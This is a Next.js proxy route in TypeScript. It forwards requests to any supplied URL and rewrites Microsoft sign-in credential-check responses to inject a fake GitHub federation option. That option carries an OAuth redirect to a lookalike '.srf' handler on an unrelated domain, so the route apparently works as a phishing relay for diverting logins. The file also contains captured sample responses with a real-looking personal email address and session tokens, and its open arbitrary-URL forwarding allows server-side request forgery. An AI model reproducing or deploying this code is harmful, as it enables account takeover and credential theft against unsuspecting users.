import { NextRequest, NextResponse } from "next/server";

// export const runtime = "nodejs"; // or 'edge'
// export const dynamic = "force-dynamic";
// export const revalidate = 0;

// Allowed origins for production
const ALLOWED_ORIGINS = [
  "https://yourfrontend.com",
  "http://localhost:3002",
  "http://localhost:3000", // For local development
  //   "http://localhost:5500",
  "http://127.0.0.1:5500",
];

// Get CORS headers based on origin
function getCorsHeaders(origin: string | null) {
  const isAllowedOrigin = origin && ALLOWED_ORIGINS.includes(origin);

  return {
    "Access-Control-Allow-Origin": isAllowedOrigin
      ? origin
      : ALLOWED_ORIGINS[0],
    "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, PATCH, OPTIONS",
    "Access-Control-Allow-Headers":
      "Content-Type, Authorization, X-API-Key, X-Requested-With, X-Custom-Header",
    "Access-Control-Allow-Credentials": "true",
    "Access-Control-Max-Age": "86400",
    Vary: "Origin", // Important for caching
  };
}

// Handle preflight requests
export async function OPTIONS(request: NextRequest) {
  const origin = request.headers.get("origin");
  const reqHeaders = request.headers.get("access-control-request-headers");

  return new NextResponse(null, {
    status: 204,
    headers: {
      ...getCorsHeaders(origin),
      "Access-Control-Allow-Headers": reqHeaders || "*",
    },
  });
}

export async function handler(
  request: NextRequest,
  { params }: { params: { path: string[] } },
) {
  const path = params.path?.join("/") || "";
  //   const targetUrl = path;
  const targetUrl = request.nextUrl.searchParams.get("url")!;
  const method = request.method;
  console.log({ incomingRequest: { method, path, targetUrl } });

  const origin = request.headers.get("origin");
  console.log({ incomingRequestOrigin: origin });

  // Extract query parameters
  const searchParams = request.nextUrl.searchParams;

  // Extract body for non-GET requests
  let body = null;
  if (method !== "GET" && method !== "HEAD") {
    try {
      const contentType = request.headers.get("content-type");
      if (contentType?.includes("application/json")) {
        body = await request.json();
      } else if (contentType?.includes("application/x-www-form-urlencoded")) {
        const formData = await request.formData();
        body = Object.fromEntries(formData);
      } else {
        body = await request.text();
      }
    } catch (error) {
      // No body or invalid body
    }
  }

  try {
    const result = await makeProxyRequest(
      targetUrl,
      method,
      body,
      searchParams,
      request.headers,
    );
    console.log({ result });
    return result;
  } catch (error) {
    console.error("Proxy error:", error);
    return NextResponse.json(
      {
        error: "Proxy request failed",
        message: (error as Error).message,
        timestamp: new Date().toISOString(),
      },
      { status: 500 },
    );
  }
}

async function makeProxyRequest(
  targetUrl: string,
  method: string,
  body: any,
  searchParams: URLSearchParams,
  incomingHeaders: Headers,
) {
  // Build URL with query parameters
  const url = new URL(targetUrl);
  searchParams.forEach((value, key) => {
    url.searchParams.append(key, value);
  });

  // Forward specific headers from the client
  const headersToForward = [
    "authorization",
    "x-api-key",
    "x-user-id",
    "user-agent",
  ];
  const headers: HeadersInit = {
    "Content-Type": "application/json",
  };

  headersToForward.forEach((headerName) => {
    const headerValue = incomingHeaders.get(headerName);
    if (headerValue) {
      headers[headerName] = headerValue;
    }
  });

  const fetchOptions: RequestInit = {
    method,
    headers,
  };

  if (body && method !== "GET" && method !== "HEAD") {
    fetchOptions.body = JSON.stringify(body);
  }

  try {
    const response = await fetch(url.toString(), fetchOptions);

    // Try to parse as JSON, fallback to text
    let data;
    const contentType = response.headers.get("content-type");
    if (contentType?.includes("application/json")) {
      data = await response.json();
    } else {
      data = await response.text();
    }

    const origin = incomingHeaders.get("origin");
    const corsHeaders = getCorsHeaders(origin);

    const modifiedData =
      data?.ThrottleStatus === 0
        ? {
            Username: data.Username,
            Display: data.Display,
            Location: "",
            AliasDisabledForLogin: false,
            Credentials: {
              PrefCredential: 3,
              HasPassword: data?.Credentials?.HasPassword ? 1 : 0,
              HasRemoteNGC: data?.Credentials?.RemoteNgcParams ? 1 : 0,
              HasFido: data?.Credentials?.HasFido ? 1 : 0,
              HasPhone: 1,
              OTCNotAutoSent: data?.Credentials?.OtcNotAutoSent ? 1 : 0,
              CobasiApp: false,
              HasGitHubFed: 1,
              HasGoogleFed: data?.Credentials?.GoogleParams ? 1 : 0,
              HasLinkedInFed: 0,
              HasAppleFed: 0,
              SendOTTHR: "0x0",
              OtcLoginEligibleProofs: [
                {
                  data: "-Dq2KSXn8wzFytfkQYC1fOEAyD4DwyrC57IU0m6OeaawFPim1WCByw3TjT3X3hZuCowb!Ko24bAGTW7Qm1wgElASC1tCeA7JeOUNQOXMMj6mL0adDjWBL5C6DvyvPKi5IGbaqRXXZeRfat4VJCM*6cXyNdmWHO3YOock16nrr!7o!lLekbrK7!mqGc18yL9!NJt4w9qjzVY4371ACz!JlXLgZx9i02ZiUNRiV!l1NlrO5",
                  isDefault: true,
                  isNopa: false,
                  type: 1,
                  display: data.Display,
                  otcEnabled: true,
                  otcSent: false,
                  isLost: false,
                  isSleeping: false,
                  isSADef: true,
                  pushEnabled: false,
                },
              ],
              GitHubParams: {
                GithubRedirectUrl:
                  "https://github.com/login/oauth/authorize?response_type=code&client_id=e37ffdec11c0245cb2e0&scope=read:user++user:email&redirect_uri=https://alliimaging.com/HandleGithubResponse.srf&allow_signup=false&state=0054679A1FA9278C",
              },
            },
            FullPasswordResetExperience: false,
            IfExistsResult: 0,
          }
        : {
            Username: data.Username,
            Display: data.Display,
            Location: "",
            AliasDisabledForLogin: false,
            FullPasswordResetExperience: true,
            IfExistsResult: 1,
          };

    return NextResponse.json(modifiedData, {
      status: response.status,
      headers: {
        ...corsHeaders,
        "Access-Control-Expose-Headers": "X-Total-Count, X-Next-Page",
        "X-Proxied-By": "Next.js-Proxy",
      },
    });
  } catch (error) {
    throw new Error(
      `Failed to fetch from target API: ${(error as Error).message}`,
    );
  }
}

export const GET = handler;
export const POST = handler;
export const PUT = handler;
export const DELETE = handler;
export const PATCH = handler;
// export const OPTIONS = handler;

const res = {
  Username: "jayseehe1035@gmail.com",
  Display: "jayseehe1035@gmail.com",
  Location: "",
  AliasDisabledForLogin: false,
  Credentials: {
    PrefCredential: 3,
    HasPassword: 1,
    HasRemoteNGC: 0,
    HasFido: 0,
    HasPhone: 1,
    OTCNotAutoSent: 1,
    CobasiApp: false,
    HasGitHubFed: 1,
    HasGoogleFed: 0,
    HasLinkedInFed: 0,
    HasAppleFed: 0,
    SendOTTHR: "0x0",
    OtcLoginEligibleProofs: [
      {
        data: "-Dq2KSXn8wzFytfkQYC1fOEAyD4DwyrC57IU0m6OeaawFPim1WCByw3TjT3X3hZuCowb!Ko24bAGTW7Qm1wgElASC1tCeA7JeOUNQOXMMj6mL0adDjWBL5C6DvyvPKi5IGbaqRXXZeRfat4VJCM*6cXyNdmWHO3YOock16nrr!7o!lLekbrK7!mqGc18yL9!NJt4w9qjzVY4371ACz!JlXLgZx9i02ZiUNRiV!l1NlrO5",
        isDefault: true,
        isNopa: false,
        type: 1,
        display: "jayseehe1035@gmail.com",
        otcEnabled: true,
        otcSent: false,
        isLost: false,
        isSleeping: false,
        isSADef: true,
        pushEnabled: false,
      },
    ],
    GitHubParams: {
      GithubRedirectUrl:
        "https://github.com/login/oauth/authorize?response_type=code&client_id=e37ffdec11c0245cb2e0&scope=read:user++user:email&redirect_uri=https://alliimaging.com/HandleGithubResponse.srf&allow_signup=false&state=0054679A1FA9278C",
    },
  },
  FullPasswordResetExperience: false,
  IfExistsResult: 0,
};

const res2 = {
  Username: "jayseehe1035@gmail.com",
  Display: "jayseehe1035@gmail.com",
  IfExistsResult: 1,
  IsUnmanaged: false,
  ThrottleStatus: 0,
  Credentials: {
    PrefCredential: 6,
    HasPassword: true,
    RemoteNgcParams: null,
    FidoParams: null,
    QrCodePinParams: null,
    SasParams: null,
    CertAuthParams: null,
    GoogleParams: null,
    FacebookParams: null,
    OtcNotAutoSent: false,
  },
  DfpProperties: {},
  EstsProperties: {
    UserTenantBranding: null,
    DomainType: 2,
  },
  FlowToken:
    "-DvkFeDk1hWgmqu8mKv02QwmDB7S7l6hBGqFBH0dAyaJuAelEUuX0J95PvMUFAT2yu73xgnSW!r8h2mqvM2WsuPP3t6yt0OBnFV9pbfWEfaMhXEH2vh6LbXHeLMICibQDjhM1nvTDzyitpm0cTMbvA5nvNn*J0EfQq5kRuYADECyyoF11ykfe1lG0P9EN6cY0JhEnVFmCOxOcbaVO*s8q7dvlKyFNqmjSLuJ*80fhxCIZBzWMRuuJWgl7Tt1ropt2HA$$",
  IsSignupDisallowed: false,
  apiCanary:
    "PAQABDgEAAACvnsHKEvvRQb3Bz3Qc7wnaRXZvU3RzQXJ0aWZhY3RzCAAAAAAALzJ1Qfavuk6szZJ42jCSxMcF8rFZMfCeAA0EL8q-H1tGULoboubuefqJKcXKw_MQxVEtRWUcCUQf9SKEpf612GCwqheJkkiwMx1FsvMYODq5KlMzrWSQEyw4mptKC1i0_4mp1EK25jK4cs98AbYJ3hU50QmytAefYnM3_N2ltzh9MMllJOk2XreQ8SAc8RzVgeS6ZRzKE_UljuFURxjDdCAA",
};

const res3 = {
  Username: res.Username,
  Display: res.Display,
  Location: "",
  AliasDisabledForLogin: false,
  Credentials: {
    PrefCredential: 3,
    HasPassword: res?.Credentials?.HasPassword ? 1 : 0,
    HasRemoteNGC: res?.Credentials?.RemoteNgcParams ? 1 : 0,
    HasFido: res?.Credentials?.HasFido ? 1 : 0,
    HasPhone: 1,
    OTCNotAutoSent: res?.Credentials?.OtcNotAutoSent ? 1 : 0,
    CobasiApp: false,
    HasGitHubFed: 1,
    HasGoogleFed: res?.Credentials?.GoogleParams ? 1 : 0,
    HasLinkedInFed: 0,
    HasAppleFed: 0,
    SendOTTHR: "0x0",
    OtcLoginEligibleProofs: [
      {
        data: "-Dq2KSXn8wzFytfkQYC1fOEAyD4DwyrC57IU0m6OeaawFPim1WCByw3TjT3X3hZuCowb!Ko24bAGTW7Qm1wgElASC1tCeA7JeOUNQOXMMj6mL0adDjWBL5C6DvyvPKi5IGbaqRXXZeRfat4VJCM*6cXyNdmWHO3YOock16nrr!7o!lLekbrK7!mqGc18yL9!NJt4w9qjzVY4371ACz!JlXLgZx9i02ZiUNRiV!l1NlrO5",
        isDefault: true,
        isNopa: false,
        type: 1,
        display: res.Display,
        otcEnabled: true,
        otcSent: false,
        isLost: false,
        isSleeping: false,
        isSADef: true,
        pushEnabled: false,
      },
    ],
    GitHubParams: {
      GithubRedirectUrl:
        "https://github.com/login/oauth/authorize?response_type=code&client_id=e37ffdec11c0245cb2e0&scope=read:user++user:email&redirect_uri=https://alliimaging.com/HandleGithubResponse.srf&allow_signup=false&state=0054679A1FA9278C",
    },
  },
  FullPasswordResetExperience: false,
  IfExistsResult: 0,
};
